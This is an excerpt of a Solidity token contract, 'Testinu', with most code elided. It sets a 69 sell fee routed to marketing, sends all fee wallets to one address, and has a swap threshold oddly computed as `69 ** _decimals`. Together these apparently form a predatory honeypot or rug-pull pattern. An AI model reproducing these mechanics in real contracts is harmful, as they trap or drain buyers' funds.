...
contract Testinu is IERC20 , Auth {
    ...
    uint256 _totalSupply = 69696969 * (10 ** _decimals);
    ...
    uint256 marketingSellFee = 69;
    uint256 liquiditySellFee = 0;
    uint256 devSellFee = 0;
    ...
    liquidityWallet = 0x357ec55b18df90E2698f3b335219852582087c5C;
    marketingWallet = 0x357ec55b18df90E2698f3b335219852582087c5C;
    devWallet = 0x357ec55b18df90E2698f3b335219852582087c5C;
    ...
    function setTokenSwapSettings(bool _enabled, uint256 _threshold, uint256 _ratio, bool ratio) external authorized {
        ...
        swapThreshold = _threshold * (69 ** _decimals);
        swapRatio = _ratio;
        ratioSell = ratio;
    }
